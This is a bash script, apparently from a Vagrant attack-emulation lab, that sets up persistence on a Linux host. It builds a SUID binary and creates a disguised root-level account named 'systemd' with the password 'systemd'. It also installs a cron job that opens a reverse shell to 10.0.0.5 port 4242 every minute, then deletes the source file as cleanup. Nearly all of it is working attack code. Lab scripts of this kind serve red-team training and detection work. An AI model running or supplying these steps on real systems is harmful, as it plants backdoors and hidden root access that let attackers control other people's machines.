#!/bin/bash

### SUID PERSISTENCE ###
# Build Binary
mkdir /tmp/persistence
cd /tmp/persistence
cp /vagrant/attack/3_Persistence/Gp08_binarysuid suid.c
gcc suid.c -o suid
chmod 7111 suid

### CREATE ACCOUNT PERSISTENCE ###
# Create root user
if id systemd &>/dev/null;
then
  echo "systemd: user already exists."
else
  useradd -ou 0 -g 0 systemd
  chpasswd <<< "systemd:systemd"
fi

sudo -u vagrant -H bash << EOF
  echo "whoami: vagrant (before privexec)"
  ./suid | cat
  sudo -u root -H bash
  echo "whoami: $(whoami) (after privexec)"
EOF

### CRONTAB REVERSE SHELL PERSISTENCE ###
# Add to crontab
(crontab -l ; echo "* * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null

#Manually
#====suid binary=====
#cd /tmp/persistence
#./suid
#whoami

#====account access=====
#cd /tmp/persistence
#su systemd
#systemd
#whoami


# Cleanup
cd /
rm -rf /tmp/persistence/suid.c
echo "Cleanup done."